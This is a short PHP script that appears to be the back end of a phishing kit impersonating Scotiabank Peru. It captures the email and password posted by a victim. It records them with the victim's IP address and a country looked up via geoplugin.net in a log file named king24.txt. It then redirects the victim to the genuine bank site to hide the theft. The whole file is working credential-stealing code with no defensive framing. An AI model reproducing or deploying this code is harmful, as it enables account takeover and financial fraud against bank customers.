<?php
ini_set("display_errors", 0);
$datod = $_POST['co'];
$datoe = $_POST['clv'];
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$archivo="king24.txt";
$file=fopen($archivo,"a");
fwrite($file, "Correo: ".$datod.PHP_EOL);
fwrite($file, "Clave: ".$datoe.PHP_EOL);
fwrite($file, "".$date.PHP_EOL);
fwrite($file, "". $ipdat->geoplugin_countryCode . PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "***********************".PHP_EOL);
fclose($file);
header ("Location:https://www.scotiabank.com.pe/Personas/Default");?>